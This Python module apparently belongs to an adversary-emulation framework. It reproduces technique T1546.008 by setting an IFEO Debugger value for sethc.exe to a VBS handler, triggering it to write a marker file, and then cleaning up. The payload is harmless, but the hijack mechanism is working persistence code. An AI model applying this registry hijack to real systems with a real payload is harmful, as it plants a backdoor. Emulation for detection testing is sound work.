from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)
_created_targets: set[str] = set()

_IFEO_KEY = (
    "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
    "Image File Execution Options\\sethc.exe"
)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Hijack sethc.exe through IFEO and trigger a benign marker command."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        setup_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            f"if (Test-Path -LiteralPath '{_IFEO_KEY}') {{ "
            "throw 'Existing sethc.exe IFEO configuration will not be overwritten' }; "
            "$handler = 'C:\\Windows\\Temp\\purplestrike_sethc_handler.vbs'; "
            "$marker = 'C:\\Windows\\Temp\\purplestrike_sethc.txt'; "
            "[IO.File]::Delete($marker); "
            "$vbs = @("
            "'Set stream = CreateObject(\"Scripting.FileSystemObject\").CreateTextFile("
            "\"C:\\Windows\\Temp\\purplestrike_sethc.txt\", True)',"
            "'stream.WriteLine \"PurpleStrike-T1546.008\"',"
            "'stream.Close'); "
            "Set-Content -LiteralPath $handler -Encoding ASCII -Value $vbs; "
            f"New-Item -Path '{_IFEO_KEY}' -Force | Out-Null; "
            "$wscript = Join-Path $env:SystemRoot 'System32\\wscript.exe'; "
            "$debugger = '\"' + $wscript + '\" //B //NoLogo \"' + $handler + '\"'; "
            f"New-ItemProperty -Path '{_IFEO_KEY}' -Name 'Debugger' "
            "-PropertyType String -Value $debugger -ErrorAction Stop | Out-Null; "
            f"$actual = (Get-ItemProperty -LiteralPath '{_IFEO_KEY}' "
            "-Name Debugger -ErrorAction Stop).Debugger; "
            "if ($actual -ne $debugger) { throw 'IFEO debugger verification failed' }"
        )
        setup = await conn.run_ps(setup_cmd)
        if not setup.success:
            raise RuntimeError(setup.stderr or setup.stdout or "Accessibility IFEO setup failed")
        _created_targets.add(target)
        result = await conn.run_ps(
            "$ErrorActionPreference = 'Stop'; "
            "$marker = 'C:\\Windows\\Temp\\purplestrike_sethc.txt'; "
            "[IO.File]::Delete($marker); "
            "$process = Start-Process -FilePath 'C:\\Windows\\System32\\sethc.exe' "
            "-WindowStyle Hidden -PassThru; "
            "for ($i=0; $i -lt 60 -and !(Test-Path -LiteralPath $marker); $i++) "
            "{ Start-Sleep -Milliseconds 250 }; "
            "if (!(Test-Path -LiteralPath $marker)) { "
            "throw ('IFEO debugger did not produce its marker; launcher pid=' + $process.Id) }; "
            "Get-Content -LiteralPath $marker -ErrorAction Stop"
        )
        return TechniqueResult(
            technique_id="T1546.008",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
            artifacts=[
                "C:\\Windows\\Temp\\purplestrike_sethc.txt",
                "C:\\Windows\\Temp\\purplestrike_sethc_handler.vbs",
            ],
            evidence=["The sethc.exe IFEO debugger executed and wrote its marker."],
        )
    except Exception as e:
        logger.error(f"T1546.008 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.008",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        if target not in _created_targets:
            return
        conn = await get_connection(target)
        cleanup_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            f"Remove-Item -LiteralPath '{_IFEO_KEY}' -Recurse -Force "
            "-ErrorAction SilentlyContinue; "
            "Remove-Item -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc.txt', "
            "'C:\\Windows\\Temp\\purplestrike_sethc_handler.vbs' "
            "-Force -ErrorAction SilentlyContinue"
        )
        removed = await conn.run_ps(cleanup_cmd)
        if not removed.success:
            raise RuntimeError(removed.stderr or removed.stdout or "Accessibility cleanup failed")
        _created_targets.discard(target)
    except Exception as e:
        logger.warning(f"T1546.008 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
